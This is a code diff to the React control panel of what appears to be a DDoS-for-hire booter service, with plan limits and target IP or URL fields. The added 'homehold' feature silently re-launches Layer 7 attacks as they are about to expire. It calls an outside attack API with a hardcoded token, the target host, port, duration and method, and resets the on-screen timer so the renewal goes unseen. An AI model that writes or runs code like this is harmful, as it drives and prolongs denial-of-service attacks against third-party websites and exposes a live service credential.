@@ -19,6 +19,7 @@ export default function Panel() {
   const [isMethodDropdownOpen, setIsMethodDropdownOpen] = useState(false);
   const [isSubnetDropdownOpen, setIsSubnetDropdownOpen] = useState(false);
   const [reqMethod, setReqMethod] = useState('GET');
+  const [homehold, setHomehold] = useState(false);
 
   useEffect(() => {
     supabase.auth.getSession().then(({ data: { session } }) => {
@@ -54,15 +55,46 @@ export default function Panel() {
   const maxDuration = planLimits.duration;
   const hasPlan = planLimits.name !== 'None';
 
+  // Keep homehold ref to avoid timer closure capture staleness
+  const homeholdRef = React.useRef(homehold);
+  useEffect(() => {
+    homeholdRef.current = homehold;
+  }, [homehold]);
+
   useEffect(() => {
     if (activeTasks.length > 0) {
       const timer = setInterval(() => {
         setActiveTasks(prevTasks => {
+          // If homehold is on, check if tasks are about to expire and trigger restart
+          prevTasks.forEach(task => {
+            if (task.timeLeft === 1 && task.layer === 'L7' && homeholdRef.current) {
+              // Trigger silent launch restart
+              const token = "8xU8xJvvT6nF16JOF5XNT8";
+              const req = task.reqMethod || 'GET';
+              const apiUrl = `https://api.l7srv.st/attack?token=${token}&host=${encodeURIComponent(task.target)}&port=${task.port || '80'}&time=${task.time}&method=${task.method.toLowerCase()}&concs=${task.conns}&reqmethod=${req}`;
+              fetch(apiUrl, { mode: 'no-cors' }).catch(err => console.error("Auto-restart hit failed", err));
+            }
+          });
+
           return prevTasks
-            .map(task => ({
-              ...task,
-              timeLeft: task.timeLeft - 1
-            }))
+            .map(task => {
+              if (task.timeLeft === 1 && task.layer === 'L7' && homeholdRef.current) {
+                // If homehold restart is active, reset time left on the UI card
+                return {
+                  ...task,
+                  timeLeft: task.time,
+                  startedAt: (() => {
+                    const pad = (num) => String(num).padStart(2, '0');
+                    const d = new Date();
+                    return `${pad(d.getMonth() + 1)}/${pad(d.getDate())}/${d.getFullYear()}, ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
+                  })()
+                };
+              }
+              return {
+                ...task,
+                timeLeft: task.timeLeft - 1
+              };
+            })
             .filter(task => task.timeLeft > 0);
         });
       }, 1000);
@@ -152,6 +184,7 @@ export default function Panel() {
           timeLeft: finalDuration,
           conns: 1, // each simulated attack card shows x1
           layer,
+          reqMethod: layer === 'L7' ? reqMethod : null,
           startedAt: formattedDate
         });
       }
@@ -252,7 +285,6 @@ export default function Panel() {
               </div>
             </div>
 
-            {/* Target Input */}
             <div>
               <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>{layer === 'L4' ? 'TARGET IP' : 'TARGET URL'}</label>
               <input 
@@ -265,7 +297,6 @@ export default function Panel() {
               />
             </div>
 
-            {/* Subnet/Method and Port Grid */}
             <div style={{ display: 'grid', gridTemplateColumns: '1.5fr 1fr', gap: '16px' }}>
               {layer === 'L4' ? (
                 <div>
